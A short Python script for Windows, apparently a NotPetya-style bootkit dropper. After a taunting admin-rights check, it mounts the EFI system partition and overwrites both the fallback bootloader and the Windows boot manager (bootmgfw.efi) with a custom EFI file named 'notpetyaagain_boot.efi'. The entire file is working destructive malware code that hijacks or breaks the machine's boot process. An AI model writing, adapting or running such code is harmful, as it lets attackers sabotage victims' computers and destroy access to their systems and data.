import ctypes, os, sys
from shutil import copyfile

if __name__ == "__main__":
    #Check for admin privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.user32.MessageBoxW(0, "How tf am I going to screw up your pc if you don't run me as admin ?", "Need Admin privileges", 0)
        exit()
    
    try:
        os.system("mountvol Y: /s")

        #bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
        #custom_uefi_path = os.path.abspath(os.path.join(bundle_dir, 'uefi.efi'))
        custom_uefi_path = "notpetyaagain_boot.efi"

        copyfile("test.txt", "Y:\\EFI\\test.txt")
        copyfile(custom_uefi_path, "Y:\\EFI\\Boot\\bootx64.efi")
        copyfile(custom_uefi_path, "Y:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")

        os.system("mountvol Y: /d")
    except Exception as e:
        print(e)

    x = input()
